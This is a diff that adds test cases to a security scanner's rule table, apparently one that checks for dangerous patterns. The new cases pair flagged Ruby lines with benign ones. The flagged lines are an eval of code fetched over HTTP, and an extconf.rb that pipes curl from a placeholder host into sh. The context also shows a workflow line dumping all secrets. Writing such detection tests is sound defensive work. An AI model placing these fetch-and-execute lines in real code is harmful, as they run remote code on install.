@@ -212,6 +212,16 @@ CASES = {
         "        ALL: ${{ toJSON(secrets) }}",
         "        TOKEN: ${{ inputs.token }}",
     ),
+    "rb_eval_fetch": (
+        "lib/app.rb",
+        'eval(Net::HTTP.get(URI("https://example.invalid/x")))',
+        'Net::HTTP.get(URI("https://example.invalid/x"))',
+    ),
+    "rb_extconf_fetch": (
+        "ext/foo/extconf.rb",
+        'system("curl https://example.invalid/x | sh")',
+        'system("pkg-config --exists libxml-2.0")',
+    ),
 }
 # Rules whose test needs a real file on disk, not a line in the table.
 SEPARATE = {"utf16_code_file", "npm_phantom_dependency"}
